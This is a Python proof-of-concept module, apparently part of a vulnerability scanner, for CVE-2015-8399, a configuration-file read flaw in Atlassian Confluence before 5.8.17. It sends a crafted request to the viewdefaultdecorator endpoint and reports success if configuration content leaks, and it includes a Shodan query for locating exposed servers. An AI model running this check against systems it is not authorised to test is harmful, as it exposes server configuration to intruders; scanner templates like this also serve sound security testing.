import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Atlassian Confluence configuration files read''',
        "description": '''Atlassian Confluence before 5.8.17 allows remote authenticated users to read configuration files via the decoratorName parameter to (1) spaces/viewdefaultdecorator.action or (2) admin/viewdefaultdecorator.action.''',
        "severity": "medium",
        "references": [
            "https://jira.atlassian.com/browse/CONFSERVER-39704?src=confmacro"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
            "cvss-score": "4.3",
            "cve-id": "CVE-2015-8399",
            "cwe-id": "CWE-200"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.component:"Atlassian Confluence"'''
        },
        "tags": ["cve", "cve2015", "atlassian", "confluence"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/spaces/viewdefaultdecorator.action?decoratorName'

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and "confluence-init.properties" in resp.text and "View Default Decorator" in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url